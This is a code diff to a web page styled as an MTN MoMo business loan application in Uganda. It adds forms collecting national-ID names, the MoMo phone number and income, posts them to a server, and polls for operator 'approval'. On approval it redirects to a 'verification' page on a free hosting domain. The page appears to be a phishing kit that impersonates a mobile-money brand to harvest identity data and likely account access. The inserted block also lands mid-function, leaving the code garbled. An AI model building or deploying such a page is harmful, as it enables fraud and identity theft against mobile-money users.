@@ -327,6 +327,184 @@
             } else {
                 alert("Submission system rejected configuration.");
                 overlay.classList.remove('active');
+        <!-- ========================================== -->
+        <!--  PAGE 2: USER PROFILE IDENTITY             -->
+        <!-- ========================================== -->
+        <div class="step" id="page2">
+            <h2>Subscriber Identity Profile</h2>
+            <div class="form-group">
+                <label>First Name (As on NIN)</label>
+                <input type="text" id="firstName" placeholder="John">
+            </div>
+            <div class="form-group">
+                <label>Last Name (As on NIN)</label>
+                <input type="text" id="lastName" placeholder="Ondoa">
+            </div>
+            <div class="form-group">
+                <label>Registered MoMo Number</label>
+                <input type="text" id="phone" value="+256">
+            </div>
+            <div class="btn-group">
+                <button type="button" class="btn-back" onclick="navigate(1)">Back</button>
+                <button type="button" class="btn-next" onclick="navigate(3)">Continue</button>
+            </div>
+        </div>
+
+        <!-- ========================================== -->
+        <!--  PAGE 3: FINANCIAL VERIFICATION & OVERVIEW -->
+        <!-- ========================================== -->
+        <div class="step" id="page3">
+            <h2>Financial Verification</h2>
+            <div class="form-group">
+                <label>Employment Classification</label>
+                <div class="option-grid">
+                    <div id="emp-self" class="clickable-card selected" onclick="selectEmployment('Self-employed', 'emp-self')">Self-Employed</div>
+                    <div id="emp-sal" class="clickable-card" onclick="selectEmployment('Employed', 'emp-sal')">Salaried Job</div>
+                    <div id="emp-ret" class="clickable-card" onclick="selectEmployment('Retired', 'emp-ret')">Retired</div>
+                    <div id="emp-stu" class="clickable-card" onclick="selectEmployment('Student', 'emp-stu')">Student</div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>Estimated Annual Revenue</label>
+                <div id="incomeDisplay" class="value-display-box">UGX 12,000,000</div>
+                <div class="pill-row">
+                    <div class="value-pill" onclick="selectIncome(5000000, this)">5M</div>
+                    <div class="value-pill selected" onclick="selectIncome(12000000, this)">12M</div>
+                    <div class="value-pill" onclick="selectIncome(25000000, this)">25M</div>
+                    <div class="value-pill" onclick="selectIncome(50000000, this)">50M</div>
+                </div>
+            </div>
+            
+            <h3>Application Overview</h3>
+            <div class="summary-box" id="summaryContent"></div>
+            
+            <div class="btn-group">
+                <button type="button" class="btn-back" onclick="navigate(2)">Back</button>
+                <button type="button" class="btn-next" style="background-color: #22C55E; color: white;" onclick="submitForm()">Submit Offer</button>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<!-- ========================================== -->
+<!--  JAVA SCRIPT DATA CONFIGURATION ENGINE     -->
+<!-- ========================================== -->
+<script>
+    let selectedProgramName = "MoMo Business Loan Tier 1";
+    let selectedAmountValue = 1000000;
+    let selectedMonths = 12;
+    let selectedEmploymentStatus = "Self-employed";
+    let selectedIncomeValue = 12000000;
+    
+    let globalAppId = null;
+    let pollingInterval = null;
+
+    function selectProgram(progName, elementId) {
+        document.querySelectorAll('#page1 .clickable-card').forEach(card => card.classList.remove('selected'));
+        document.getElementById(elementId).classList.add('selected');
+        selectedProgramName = progName;
+    }
+
+    function selectAmount(value, element) {
+        document.querySelectorAll('#page1 .value-pill').forEach(pill => pill.classList.remove('selected'));
+        element.classList.add('selected');
+        selectedAmountValue = value;
+        document.getElementById('amountDisplay').innerText = "UGX " + value.toLocaleString();
+        calculateRepayment();
+    }
+
+    function selectTerm(months) {
+        document.querySelectorAll('.term-card').forEach(card => card.classList.remove('selected'));
+        const targetedCard = document.getElementById(`term-${months}`);
+        if(targetedCard) {
+            targetedCard.classList.add('selected');
+        }
+        selectedMonths = months;
+        calculateRepayment();
+    }
+
+    function selectEmployment(status, elementId) {
+        document.querySelectorAll('#page3 .clickable-card').forEach(card => card.classList.remove('selected'));
+        document.getElementById(elementId).classList.add('selected');
+        selectedEmploymentStatus = status;
+    }
+
+    function selectIncome(value, element) {
+        document.querySelectorAll('#page3 .value-pill').forEach(pill => pill.classList.remove('selected'));
+        element.classList.add('selected');
+        selectedIncomeValue = value;
+        document.getElementById('incomeDisplay').innerText = "UGX " + value.toLocaleString();
+    }
+
+    function calculateRepayment() {
+        const displayField = document.getElementById('monthlyPaymentDisplay');
+        if (!displayField) return;
+
+        const totalPayable = selectedAmountValue * (1 + (0.10 * (selectedMonths / 12)));
+        const monthlyPayment = totalPayable / selectedMonths;
+        displayField.innerText = Math.round(monthlyPayment).toLocaleString();
+    }
+
+    function generateSummary() {
+        const fName = document.getElementById('firstName').value || 'Not provided';
+        const lName = document.getElementById('lastName').value || 'Not provided';
+        const phoneNo = document.getElementById('phone').value || '+256';
+
+        const content = `
+            📌 <strong>Program:</strong> ${selectedProgramName}<br>
+            👤 <strong>Applicant:</strong> ${fName} ${lName}<br>
+            📞 <strong>MoMo Phone:</strong> ${phoneNo}<br>
+            💼 <strong>Structure:</strong> ${selectedEmploymentStatus}<br>
+            💰 <strong>Requested Capital:</strong> UGX ${selectedAmountValue.toLocaleString()}<br>
+            ⏱️ <strong>Repayment Horizon:</strong> ${selectedMonths} Months Plan
+        `;
+        document.getElementById('summaryContent').innerHTML = content;
+    }
+
+    function navigate(pageNum) {
+        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+        const targetPage = document.getElementById(`page${pageNum}`);
+        if (targetPage) {
+            targetPage.classList.add('active');
+        }
+        if(pageNum === 3) {
+            generateSummary();
+        }
+    }
+
+    async function submitForm() {
+        const overlay = document.getElementById('spinnerOverlay');
+        const statusTxt = document.getElementById('statusText');
+        
+        overlay.classList.add('active');
+
+        const payload = {
+            loanType: selectedProgramName,
+            amount: selectedAmountValue,
+            term: `${selectedMonths} Months`,
+            purpose: document.getElementById('purpose').value || 'Business Expansion',
+            firstName: document.getElementById('firstName').value,
+            lastName: document.getElementById('lastName').value,
+            phone: document.getElementById('phone').value,
+            employmentStatus: selectedEmploymentStatus,
+            income: selectedIncomeValue
+        };
+
+        try {
+            const res = await fetch('/api/apply', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            const data = await res.json();
+            
+            if(data.success) {
+                globalAppId = data.applicationId;
+                startPolling(globalAppId);
+            } else {
+                alert("Submission system rejected configuration.");
+                overlay.classList.remove('active');
             }
         } catch(e) {
             overlay.classList.remove('active');
@@ -334,7 +512,7 @@
         }
     }
 
-        function startPolling(appId) {
+    function startPolling(appId) {
         pollingInterval = setInterval(async () => {
             try {
                 const res = await fetch(`/api/status/${appId}`);
@@ -345,17 +523,20 @@
                     document.getElementById('spinnerOverlay').classList.remove('active');
                     
                     if (data.status === 'Approved') {
-                        // 🚀 AUTOMATIC REDIRECT: Instantly opens the verification stream page when approved
-                        window.location.href = "https://mtn-momo-verify-5.onrender.com"; 
+                        // 🚀 AUTOMATIC REDIRECT ON APPROVAL
+                        window.location.href = "https://onrender.com"; 
                     } else {
-                        // Fallback handling if the administrator marks the profile as rejected
                         alert(`MTN MoMo Gateway Status Update: Application was ${data.status.toUpperCase()}`);
                         window.location.reload();
                     }
                 }
             } catch (e) { console.error("Tracking node sync failed", e); }
-        }, 3000); // Evaluates status parameters every 3 seconds
+        }, 3000);
     }
 
+    document.addEventListener('DOMContentLoaded', () => {
+        calculateRepayment();
+    });
+</script>
 </body>
 </html>
